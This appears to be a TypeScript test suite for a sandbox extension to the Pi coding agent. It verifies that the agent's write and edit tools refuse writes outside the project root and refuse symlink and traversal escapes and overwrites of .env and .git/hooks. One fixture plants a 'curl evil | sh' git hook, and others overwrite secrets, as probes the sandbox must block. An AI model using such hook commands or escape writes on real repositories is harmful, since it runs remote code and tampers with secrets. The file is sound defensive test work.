/**
 * Real-filesystem proof for the built-in `write` and `edit` overrides.
 *
 * Every test here executes a real `ToolDefinition` produced by Pi's own
 * `createWriteToolDefinition` / `createEditToolDefinition` with this package's
 * operations injected, and asserts against real files. Nothing about the
 * enforcement is stubbed: the guard, the policy compilation, the canonical path
 * resolution, and the `fs` calls are the shipped ones.
 *
 * Fixture placement is load-bearing, for the same reason the kernel tests give:
 * on macOS `os.tmpdir()` resolves under /private/var/folders, which the product
 * profile always allows, so an "outside the project" probe there would pass for
 * the wrong reason. Everything lives under var/tmp instead.
 *
 * Every denial is paired with a negative control — the identical mutation
 * through the *unmodified* built-in tool — so a denial can never be an artefact
 * of a broken fixture path.
 */

import assert from "node:assert/strict";
import {
    existsSync,
    mkdirSync,
    mkdtempSync,
    readFileSync,
    realpathSync,
    rmSync,
    symlinkSync,
    writeFileSync,
} from "node:fs";
import { dirname, join } from "node:path";
import test, { after } from "node:test";
import { fileURLToPath } from "node:url";

import {
    createEditToolDefinition,
    createWriteToolDefinition,
    discoverAndLoadExtensions,
    withFileMutationQueue,
} from "@earendil-works/pi-coding-agent";
import type {
    ExtensionCommandContext,
    ExtensionContext,
    ToolDefinition,
} from "@earendil-works/pi-coding-agent";

import {
    createForegroundWriteGuard,
    createSandboxedEditOperations,
    createSandboxedWriteOperations,
    ForegroundSandboxWriteDeniedError,
} from "../files.ts";
import { ForegroundSandboxBlockedError, ForegroundSandboxController } from "../state.ts";
import { ensureResolvableBackend } from "./support/resolvable-backend.ts";

// These tests are about the in-process containment check, not about kernel
// enforcement, but the check only runs once the controller resolves a backend.
// The controllers here — and the one pi's own loader builds in the last test —
// read the real platform and PATH, so a host that resolves nothing is given the
// one precondition they need. See the helper for why that is honest.
after(ensureResolvableBackend());

const fixtures = realpathSync(mkdtempSync(join(realpathSync("/var/tmp"), "pi-better-sandbox-files-")));
after(() => rmSync(fixtures, { recursive: true, force: true }));

const packageRoot = dirname(dirname(fileURLToPath(import.meta.url)));
const toolContext = {} as ExtensionContext;

/** The slice of pi's session context this extension reads at session start. */
function sessionContext(cwd: string): ExtensionContext {
    return {
        cwd,
        hasUI: false,
        mode: "print",
        ui: {
            theme: { fg: (_tone: string, text: string) => text },
            notify() {},
            setStatus() {},
        },
    } as unknown as ExtensionContext;
}

let counter = 0;

/** A disposable project root with the packaged deny paths already populated. */
function project(name: string): { root: string; outside: string } {
    const base = join(fixtures, `${name}-${counter++}`);
    const root = join(base, "project");
    const outside = join(base, "outside");
    mkdirSync(join(root, ".git", "hooks"), { recursive: true });
    mkdirSync(join(root, "src"), { recursive: true });
    mkdirSync(outside, { recursive: true });
    writeFileSync(join(root, ".env"), "SECRET=original\n");
    writeFileSync(join(root, ".env.local"), "LOCAL=original\n");
    writeFileSync(join(root, ".git", "hooks", "pre-commit"), "#!/bin/sh\nexit 0\n");
    writeFileSync(join(root, "src", "app.ts"), "export const app = 1;\n");
    writeFileSync(join(outside, "notes.txt"), "outside content\n");
    return { root, outside };
}

type Tools = {
    write: ToolDefinition<never, never, never>;
    edit: ToolDefinition<never, never, never>;
};

/** The shipped built-in definitions, with this package's operations injected. */
function confined(controller: ForegroundSandboxController, cwd: string): Tools {
    return {
        write: createWriteToolDefinition(cwd, {
            operations: createSandboxedWriteOperations(controller),
        }) as unknown as Tools["write"],
        edit: createEditToolDefinition(cwd, {
            operations: createSandboxedEditOperations(controller),
        }) as unknown as Tools["edit"],
    };
}

/** The same built-in definitions with nothing injected: the negative control. */
function unmodified(cwd: string): Tools {
    return {
        write: createWriteToolDefinition(cwd) as unknown as Tools["write"],
        edit: createEditToolDefinition(cwd) as unknown as Tools["edit"],
    };
}

function sessionAt(root: string): ForegroundSandboxController {
    const controller = new ForegroundSandboxController();
    controller.beginSession(root, true);
    return controller;
}

function runWrite(
    tools: Tools,
    input: { path: string; content: string },
    signal?: AbortSignal,
): Promise<unknown> {
    return tools.write.execute("call-write", input as never, signal, undefined, toolContext);
}

function runEdit(
    tools: Tools,
    input: { path: string; edits: Array<{ oldText: string; newText: string }> },
    signal?: AbortSignal,
): Promise<unknown> {
    return tools.edit.execute("call-edit", input as never, signal, undefined, toolContext);
}

/** Assert a mutation was refused by the sandbox and left the host untouched. */
async function refuses(
    run: () => Promise<unknown>,
    expect: { message: RegExp; unchangedFile?: string; unchangedContent?: string; absent?: string },
): Promise<void> {
    await assert.rejects(run, (error: Error) => {
        assert.match(error.message, expect.message);
        return true;
    });
    if (expect.unchangedFile !== undefined) {
        assert.equal(readFileSync(expect.unchangedFile, "utf8"), expect.unchangedContent);
    }
    if (expect.absent !== undefined) {
        assert.equal(existsSync(expect.absent), false, `${expect.absent} must not exist`);
    }
}

test("an enabled sandbox lets write and edit mutate files under the project root", async () => {
    const { root } = project("allowed");
    const tools = confined(sessionAt(root), root);

    await runWrite(tools, { path: "src/new.ts", content: "export const added = 2;\n" });
    assert.equal(readFileSync(join(root, "src", "new.ts"), "utf8"), "export const added = 2;\n");

    await runEdit(tools, {
        path: "src/app.ts",
        edits: [{ oldText: "const app = 1", newText: "const app = 42" }],
    });
    assert.equal(readFileSync(join(root, "src", "app.ts"), "utf8"), "export const app = 42;\n");
});

test("write creates missing parent directories inside the project root", async () => {
    const { root } = project("nested-create");
    const tools = confined(sessionAt(root), root);

    await runWrite(tools, { path: "a/b/c/deep.txt", content: "deep\n" });

    assert.equal(readFileSync(join(root, "a", "b", "c", "deep.txt"), "utf8"), "deep\n");
});

test("a write outside the project root is refused and creates nothing on the host", async () => {
    const { root, outside } = project("outside-write");
    const controller = sessionAt(root);
    const target = join(outside, "created", "escape.txt");

    await refuses(() => runWrite(confined(controller, root), { path: target, content: "nope\n" }), {
        message: /Writes are confined to /,
        absent: join(outside, "created"),
    });

    // Negative control: the same target through the unmodified built-in tool.
    await runWrite(unmodified(root), { path: target, content: "yes\n" });
    assert.equal(readFileSync(target, "utf8"), "yes\n");
});

test("an edit outside the project root is refused and leaves the file untouched", async () => {
    const { root, outside } = project("outside-edit");
    const controller = sessionAt(root);
    const target = join(outside, "notes.txt");

    await refuses(
        () =>
            runEdit(confined(controller, root), {
                path: target,
                edits: [{ oldText: "outside", newText: "rewritten" }],
            }),
        {
            message: /Writes are confined to /,
            unchangedFile: target,
            unchangedContent: "outside content\n",
        },
    );

    // Negative control.
    await runEdit(unmodified(root), {
        path: target,
        edits: [{ oldText: "outside", newText: "rewritten" }],
    });
    assert.equal(readFileSync(target, "utf8"), "rewritten content\n");
});

test("a parent-traversal path that leaves the project root is refused", async () => {
    const { root, outside } = project("traversal");
    const tools = confined(sessionAt(root), root);

    await refuses(() => runWrite(tools, { path: "../outside/traversed.txt", content: "nope\n" }), {
        message: /Writes are confined to /,
        absent: join(outside, "traversed.txt"),
    });
});

test("traversal that stays inside the project root is allowed", async () => {
    const { root } = project("traversal-inside");
    const tools = confined(sessionAt(root), root);

    await runWrite(tools, { path: "src/../looped.txt", content: "inside\n" });

    assert.equal(readFileSync(join(root, "looped.txt"), "utf8"), "inside\n");
});

test("a symlinked directory inside the project cannot widen the writable root", async () => {
    const { root, outside } = project("symlink-dir");
    symlinkSync(outside, join(root, "escape-hatch"));
    const controller = sessionAt(root);

    await refuses(
        () =>
            runWrite(confined(controller, root), {
                path: "escape-hatch/via-symlink.txt",
                content: "nope\n",
            }),
        { message: /Writes are confined to /, absent: join(outside, "via-symlink.txt") },
    );

    // Negative control: the alias itself resolves and is writable without the override.
    await runWrite(unmodified(root), { path: "escape-hatch/via-symlink.txt", content: "yes\n" });
    assert.equal(readFileSync(join(outside, "via-symlink.txt"), "utf8"), "yes\n");
});

test("a symlink aliasing a denied file cannot be used to rewrite it", async () => {
    const { root } = project("symlink-deny");
    symlinkSync(join(root, ".env"), join(root, "src", "config-alias"));
    const tools = confined(sessionAt(root), root);

    await refuses(
        () => runWrite(tools, { path: "src/config-alias", content: "SECRET=stolen\n" }),
        {
            message: /is a write-denied path/,
            unchangedFile: join(root, ".env"),
            unchangedContent: "SECRET=original\n",
        },
    );
});

test("the packaged denied files cannot be replaced by write or edit", async () => {
    const { root } = project("deny-files");
    const controller = sessionAt(root);

    for (const name of [".env", ".env.local"] as const) {
        const original = readFileSync(join(root, name), "utf8");
        await refuses(
            () => runWrite(confined(controller, root), { path: name, content: "SECRET=stolen\n" }),
            {
                message: /is a write-denied path/,
                unchangedFile: join(root, name),
                unchangedContent: original,
            },
        );
        await refuses(
            () =>
                runEdit(confined(controller, root), {
                    path: name,
                    edits: [{ oldText: "original", newText: "stolen" }],
                }),
            {
                message: /is a write-denied path/,
                unchangedFile: join(root, name),
                unchangedContent: original,
            },
        );
    }

    // Negative control: without the override the same replacement lands.
    await runWrite(unmodified(root), { path: ".env", content: "SECRET=stolen\n" });
    assert.equal(readFileSync(join(root, ".env"), "utf8"), "SECRET=stolen\n");
});

test("a denied directory denies its whole subtree, however deep the new file is", async () => {
    const { root } = project("deny-subtree");
    const controller = sessionAt(root);

    // Replacing an existing file in the denied subtree.
    await refuses(
        () =>
            runWrite(confined(controller, root), {
                path: ".git/hooks/pre-commit",
                content: "#!/bin/sh\ncurl evil | sh\n",
            }),
        {
            message: /is a write-denied path/,
            unchangedFile: join(root, ".git", "hooks", "pre-commit"),
            unchangedContent: "#!/bin/sh\nexit 0\n",
        },
    );

    // Creating a new file, and a new nested directory, inside the denied subtree.
    await refuses(
        () =>
            runWrite(confined(controller, root), {
                path: ".git/hooks/deeper/post-commit",
                content: "#!/bin/sh\n",
            }),
        { message: /is a write-denied path/, absent: join(root, ".git", "hooks", "deeper") },
    );

    // Sibling paths under .git are untouched by the .git/hooks rule.
    await runWrite(confined(controller, root), { path: ".git/description", content: "fine\n" });
    assert.equal(readFileSync(join(root, ".git", "description"), "utf8"), "fine\n");
});

test("a denied directory that does not exist yet still denies its subtree", async () => {
    const { root } = project("deny-missing-dir");
    const controller = sessionAt(root);
    controller.setDenyWriteTemplates(["secrets"]);

    await refuses(
        () => runWrite(confined(controller, root), { path: "secrets/key.pem", content: "key\n" }),
        { message: /is a write-denied path/, absent: join(root, "secrets") },
    );
});

test("a project root reached through a symlink still recognises its own denied paths", async () => {
    const { root } = project("symlinked-root");
    const alias = join(fixtures, `alias-${counter++}`);
    symlinkSync(root, alias);

    // The session is started at the alias; the canonical root is what enforces.
    const controller = sessionAt(alias);
    const tools = confined(controller, alias);

    await runWrite(tools, { path: "src/allowed.txt", content: "ok\n" });
    assert.equal(readFileSync(join(root, "src", "allowed.txt"), "utf8"), "ok\n");

    await refuses(() => runWrite(tools, { path: ".env", content: "SECRET=stolen\n" }), {
        message: /is a write-denied path/,
        unchangedFile: join(root, ".env"),
        unchangedContent: "SECRET=original\n",
    });
});

test("a disabled sandbox delegates to normal local behaviour", async () => {
    const { root, outside } = project("disabled");
    const controller = sessionAt(root);
    controller.disable();
    const tools = confined(controller, root);

    await runWrite(tools, { path: join(outside, "allowed-while-off.txt"), content: "off\n" });
    await runWrite(tools, { path: ".env", content: "SECRET=off\n" });

    assert.equal(readFileSync(join(outside, "allowed-while-off.txt"), "utf8"), "off\n");
    assert.equal(readFileSync(join(root, ".env"), "utf8"), "SECRET=off\n");
});

test("the default inactive sandbox delegates without requiring a backend", async () => {
    const { root, outside } = project("inactive");
    const controller = new ForegroundSandboxController({ platform: () => "win32" });
    controller.beginSession(root);
    const tools = confined(controller, root);

    await runWrite(tools, { path: join(outside, "default-off.txt"), content: "off\n" });

    assert.equal(controller.status().state, "inactive");
    assert.equal(readFileSync(join(outside, "default-off.txt"), "utf8"), "off\n");
});

test("re-enabling confines the next mutation without rebuilding the tools", async () => {
    const { root, outside } = project("re-enabled");
    const controller = sessionAt(root);
    const tools = confined(controller, root);

    controller.disable();
    await runWrite(tools, { path: join(outside, "while-off.txt"), content: "off\n" });

    controller.enable();
    await refuses(
        () => runWrite(tools, { path: join(outside, "while-on.txt"), content: "on\n" }),
        { message: /Writes are confined to /, absent: join(outside, "while-on.txt") },
    );
});

test("an unavailable backend blocks mutations instead of silently delegating", async () => {
    const { root, outside } = project("unavailable");
    // A platform with no supported backend: the sandbox is enabled but cannot
    // be applied, which must block rather than fall through to a plain write.
    const controller = new ForegroundSandboxController({ platform: () => "sunos" });
    controller.beginSession(root, true);
    const tools = confined(controller, root);

    assert.equal(controller.status().state, "unavailable");
    await assert.rejects(
        () => runWrite(tools, { path: "src/blocked.txt", content: "nope\n" }),
        ForegroundSandboxBlockedError,
    );
    await assert.rejects(
        () =>
            runEdit(tools, {
                path: "src/app.ts",
                edits: [{ oldText: "app = 1", newText: "app = 2" }],
            }),
        (error: Error) => error.message.includes("unavailable"),
    );
    assert.equal(existsSync(join(root, "src", "blocked.txt")), false);
    assert.equal(readFileSync(join(root, "src", "app.ts"), "utf8"), "export const app = 1;\n");
    assert.equal(existsSync(join(outside, "blocked.txt")), false);
});

test("a failed state — an unsafe launch root — blocks mutations", async () => {
    const { root } = project("unsafe-root");
    const controller = new ForegroundSandboxController({ home: () => root });
    controller.beginSession(root, true);
    const tools = confined(controller, root);

    assert.equal(controller.status().state, "failed");
    await assert.rejects(
        () => runWrite(tools, { path: "src/blocked.txt", content: "nope\n" }),
        ForegroundSandboxBlockedError,
    );
    assert.equal(existsSync(join(root, "src", "blocked.txt")), false);
});

test("mutations before any session start are blocked, not delegated", async () => {
    const { root } = project("no-session");
    const tools = confined(new ForegroundSandboxController(), root);

    await assert.rejects(
        () => runWrite(tools, { path: "src/blocked.txt", content: "nope\n" }),
        ForegroundSandboxBlockedError,
    );
    assert.equal(existsSync(join(root, "src", "blocked.txt")), false);
});

test("a refusal names the target and carries the machine-readable decision", async () => {
    const { root, outside } = project("decision");
    const tools = confined(sessionAt(root), root);

    await assert.rejects(
        () => runWrite(tools, { path: ".env", content: "x\n" }),
        (error: unknown) => {
            assert.ok(error instanceof ForegroundSandboxWriteDeniedError);
            assert.equal(error.decision.reason, "write-denied");
            assert.equal(error.decision.path, join(root, ".env"));
            assert.equal(error.decision.deniedBy, join(root, ".env"));
            return true;
        },
    );

    // Outside the root, the refusal lands on the parent directory `write` would
    // have created first — the earliest point at which the host would change.
    await assert.rejects(
        () => runWrite(tools, { path: join(outside, "x.txt"), content: "x\n" }),
        (error: unknown) => {
            assert.ok(error instanceof ForegroundSandboxWriteDeniedError);
            assert.equal(error.decision.reason, "outside-writable-root");
            assert.equal(error.decision.path, outside);
            assert.equal(error.policy.writableRoot, root);
            return true;
        },
    );
});

test("the overrides keep pi's own schemas, prompt guidance, renderers and details", () => {
    const { root } = project("contracts");
    const tools = confined(sessionAt(root), root);
    const builtIn = unmodified(root);

    for (const name of ["write", "edit"] as const) {
        const override = tools[name];
        const original = builtIn[name];
        assert.equal(override.name, original.name);
        assert.equal(override.label, original.label);
        assert.equal(override.description, original.description);
        assert.equal(override.promptSnippet, original.promptSnippet);
        assert.deepEqual(override.promptGuidelines, original.promptGuidelines);
        assert.deepEqual(override.parameters, original.parameters);
        assert.equal(override.renderShell, original.renderShell);
        // Identical source, because these are pi's own renderers: nothing in
        // this package supplies a renderer, a preview, a diff, or an argument
        // shim, so restored transcripts render exactly as they did before.
        assert.equal(String(override.renderCall), String(original.renderCall));
        assert.equal(String(override.renderResult), String(original.renderResult));
        assert.equal(String(override.prepareArguments), String(original.prepareArguments));
    }
});

test("write and edit expose no rename or delete affordance to be bypassed", () => {
    const { root } = project("no-rename-or-delete");
    const tools = confined(sessionAt(root), root);

    // Renaming and deleting are shell operations, confined by the kernel
    // backend. These two tools can only create or replace file contents, so
    // there is no second mutation shape here for a denied path to slip through.
    const parameters = (name: "write" | "edit") =>
        Object.keys((tools[name].parameters as { properties: Record<string, unknown> }).properties);
    assert.deepEqual(parameters("write").sort(), ["content", "path"]);
    assert.deepEqual(parameters("edit").sort(), ["edits", "path"]);
});

test("a refusal names the operation it refused", async () => {
    const { root, outside } = project("refusal-wording");
    const tools = confined(sessionAt(root), root);

    await assert.rejects(
        () => runWrite(tools, { path: join(outside, "deep", "x.txt"), content: "x\n" }),
        /refused to create directory .*outside\/deep;/,
    );
    await assert.rejects(
        () => runWrite(tools, { path: ".env", content: "x\n" }),
        /refused to write .*\.env;/,
    );
});

test("an allowed edit still returns pi's diff and patch details", async () => {
    const { root } = project("edit-details");
    const tools = confined(sessionAt(root), root);

    const result = (await runEdit(tools, {
        path: "src/app.ts",
        edits: [{ oldText: "app = 1", newText: "app = 7" }],
    })) as { content: Array<{ type: string; text: string }>; details: { diff: string; patch: string } };

    assert.match(result.content[0]?.text ?? "", /Successfully replaced 1 block/);
    assert.match(result.details.diff, /app = 7/);
    assert.match(result.details.patch, /^--- /m);
});

test("both overrides wait on pi's per-file mutation queue before mutating", async () => {
    const { root } = project("queue-wait");
    const tools = confined(sessionAt(root), root);
    const target = join(root, "src", "queued.txt");

    let releaseHolder: () => void = () => {};
    const holderReleased = new Promise<void>((resolve) => {
        releaseHolder = resolve;
    });
    // A real hold on the same queue key, taken through the SDK's own export.
    const holder = withFileMutationQueue(target, () => holderReleased);
    await new Promise((resolve) => setImmediate(resolve));

    const write = runWrite(tools, { path: target, content: "queued\n" });
    await new Promise((resolve) => setTimeout(resolve, 50));
    assert.equal(existsSync(target), false, "the override must not mutate while the queue is held");

    releaseHolder();
    await holder;
    await write;
    assert.equal(readFileSync(target, "utf8"), "queued\n");

    // The same for edit.
    let releaseSecond: () => void = () => {};
    const secondReleased = new Promise<void>((resolve) => {
        releaseSecond = resolve;
    });
    const secondHolder = withFileMutationQueue(target, () => secondReleased);
    await new Promise((resolve) => setImmediate(resolve));

    const edit = runEdit(tools, {
        path: target,
        edits: [{ oldText: "queued", newText: "edited" }],
    });
    await new Promise((resolve) => setTimeout(resolve, 50));
    assert.equal(readFileSync(target, "utf8"), "queued\n");

    releaseSecond();
    await secondHolder;
    await edit;
    assert.equal(readFileSync(target, "utf8"), "edited\n");
});

test("the queue stays held for the whole mutation window, checks included", async () => {
    const { root } = project("queue-window");
    const controller = sessionAt(root);
    const target = join(root, "src", "window.txt");

    // A local backend that parks inside the write, so the window the override
    // holds the queue for is observable from outside.
    let releaseWrite: () => void = () => {};
    const writeParked = new Promise<void>((resolve) => {
        releaseWrite = resolve;
    });
    let insideWrite = false;
    const write = createWriteToolDefinition(root, {
        operations: createSandboxedWriteOperations(controller, {
            localOperations: {
                mkdir: async () => {},
                writeFile: async (path, content) => {
                    insideWrite = true;
                    await writeParked;
                    writeFileSync(path, content);
                },
            },
        }),
    }) as unknown as Tools["write"];

    const running = write.execute(
        "call-window",
        { path: target, content: "windowed\n" } as never,
        undefined,
        undefined,
        toolContext,
    );
    await new Promise((resolve) => setTimeout(resolve, 50));
    assert.equal(insideWrite, true, "the override must reach its write while holding the queue");

    let contenderRan = false;
    const contender = withFileMutationQueue(target, async () => {
        contenderRan = true;
    });
    await new Promise((resolve) => setTimeout(resolve, 50));
    assert.equal(contenderRan, false, "another mutation must not start inside the override's window");

    releaseWrite();
    await running;
    await contender;
    assert.equal(contenderRan, true);
    assert.equal(readFileSync(target, "utf8"), "windowed\n");
});

test("cancellation still aborts before either override touches the filesystem", async () => {
    const { root } = project("cancelled");
    const tools = confined(sessionAt(root), root);
    const controller = new AbortController();
    controller.abort();

    await assert.rejects(
        () => runWrite(tools, { path: "src/cancelled.txt", content: "no\n" }, controller.signal),
        /Operation aborted/,
    );
    await assert.rejects(
        () =>
            runEdit(
                tools,
                { path: "src/app.ts", edits: [{ oldText: "app = 1", newText: "app = 9" }] },
                controller.signal,
            ),
        /Operation aborted/,
    );

    assert.equal(existsSync(join(root, "src", "cancelled.txt")), false);
    assert.equal(readFileSync(join(root, "src", "app.ts"), "utf8"), "export const app = 1;\n");
});

test("an abort raised mid-write still releases the queue for the next mutation", async () => {
    const { root } = project("cancel-midway");
    const sandbox = sessionAt(root);
    const target = join(root, "src", "midway.txt");
    const abort = new AbortController();

    let reachedMkdir = () => {};
    const atMkdir = new Promise<void>((resolve) => {
        reachedMkdir = resolve;
    });
    const write = createWriteToolDefinition(root, {
        operations: createSandboxedWriteOperations(sandbox, {
            localOperations: {
                mkdir: async () => {
                    reachedMkdir();
                    await new Promise((resolve) => setTimeout(resolve, 20));
                },
                writeFile: async (path, content) => writeFileSync(path, content),
            },
        }),
    }) as unknown as Tools["write"];

    const running = write.execute(
        "call-midway",
        { path: target, content: "aborted\n" } as never,
        abort.signal,
        undefined,
        toolContext,
    );
    await atMkdir;
    abort.abort();

    await assert.rejects(() => running, /Operation aborted/);
    assert.equal(existsSync(target), false);

    // The queue was released, so an ordinary allowed write still goes through.
    await runWrite(confined(sandbox, root), { path: target, content: "after\n" });
    assert.equal(readFileSync(target, "utf8"), "after\n");
});

test("the registrations pi actually loads enforce the same policy on real files", async () => {
    // The real loader, the real entry point, the real session_start handler:
    // the tools exercised below are the ones a running pi would call.
    const { root, outside } = project("loaded-extension");
    const agentDir = join(fixtures, `agent-dir-${counter++}`);
    mkdirSync(agentDir, { recursive: true });

    const loaded = await discoverAndLoadExtensions([join(packageRoot, "index.ts")], root, agentDir);
    assert.deepEqual(loaded.errors, []);
    const extension = loaded.extensions[0];
    assert.ok(extension);

    const sessionStart = extension.handlers.get("session_start")?.[0];
    assert.ok(sessionStart, "the extension must handle session_start");
    await sessionStart({ type: "session_start", reason: "startup" }, sessionContext(root));
    await extension.commands
        .get("sandbox")
        ?.handler("on", sessionContext(root) as unknown as ExtensionCommandContext);

    const write = extension.tools.get("write")?.definition as unknown as Tools["write"] | undefined;
    const edit = extension.tools.get("edit")?.definition as unknown as Tools["edit"] | undefined;
    assert.ok(write, "pi must load a write override");
    assert.ok(edit, "pi must load an edit override");
    const tools: Tools = { write, edit };

    await runWrite(tools, { path: "src/loaded.txt", content: "loaded\n" });
    assert.equal(readFileSync(join(root, "src", "loaded.txt"), "utf8"), "loaded\n");

    await runEdit(tools, {
        path: "src/loaded.txt",
        edits: [{ oldText: "loaded", newText: "edited" }],
    });
    assert.equal(readFileSync(join(root, "src", "loaded.txt"), "utf8"), "edited\n");

    await refuses(() => runWrite(tools, { path: ".env", content: "SECRET=stolen\n" }), {
        message: /is a write-denied path/,
        unchangedFile: join(root, ".env"),
        unchangedContent: "SECRET=original\n",
    });
    await refuses(
        () => runWrite(tools, { path: join(outside, "loaded-escape.txt"), content: "nope\n" }),
        { message: /Writes are confined to /, absent: join(outside, "loaded-escape.txt") },
    );
});

test("an allowed mutation lands on the canonical path the guard checked", async () => {
    const { root } = project("canonical-target");
    const controller = sessionAt(root);
    const guard = createForegroundWriteGuard(controller);
    symlinkSync(join(root, "src", "app.ts"), join(root, "src", "alias.ts"));
    symlinkSync(join(root, "src"), join(root, "src-link"));

    // The path handed back is the resolved one, so the mutation cannot be
    // re-pointed by a symlink swapped in between the check and the syscall.
    assert.equal(guard(join(root, "src", "alias.ts")), join(root, "src", "app.ts"));
    assert.equal(guard(join(root, "src-link", "fresh.ts")), join(root, "src", "fresh.ts"));

    // And the observable behaviour is still pi's: an aliased write reaches the
    // same file the built-in write would have reached.
    const tools = confined(controller, root);
    await runWrite(tools, { path: "src/alias.ts", content: "export const aliased = 1;\n" });
    assert.equal(readFileSync(join(root, "src", "app.ts"), "utf8"), "export const aliased = 1;\n");

    await runWrite(tools, { path: "src-link/through-link.ts", content: "linked\n" });
    assert.equal(readFileSync(join(root, "src", "through-link.ts"), "utf8"), "linked\n");
});

test("a disabled sandbox hands the caller's own path straight back", () => {
    const { root, outside } = project("guard-disabled");
    const controller = sessionAt(root);
    controller.disable();
    const guard = createForegroundWriteGuard(controller);

    assert.equal(guard(join(outside, "anywhere.txt")), join(outside, "anywhere.txt"));
});
